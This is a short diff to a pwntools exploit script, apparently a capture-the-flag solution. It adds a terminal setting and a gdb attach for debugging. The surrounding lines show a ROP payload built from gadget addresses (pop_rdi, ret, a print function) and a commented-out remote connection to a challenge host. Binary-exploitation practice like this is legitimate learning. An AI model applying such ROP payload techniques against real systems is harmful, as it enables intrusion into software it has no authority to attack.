@@ -3,7 +3,7 @@ from pwn import p64
 import socket
 from ctypes import *
 context(arch='amd64', os='linux', log_level='DEBUG')
-
+context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
 # host = "node.yuzhian.com.cn"
 # ip = socket.gethostbyname(host)
 # r = remote(ip,37506)#远程连接
@@ -51,7 +51,9 @@ for i in range(len(flag_xor)):
 payload += p64(pop_rdi) + p64(data_addr) + p64(ret) + p64(print_addr)
 
 
-# pause()
+
+gdb.attach(r)
+pause()
 
 r.sendlineafter(b">", payload)
 
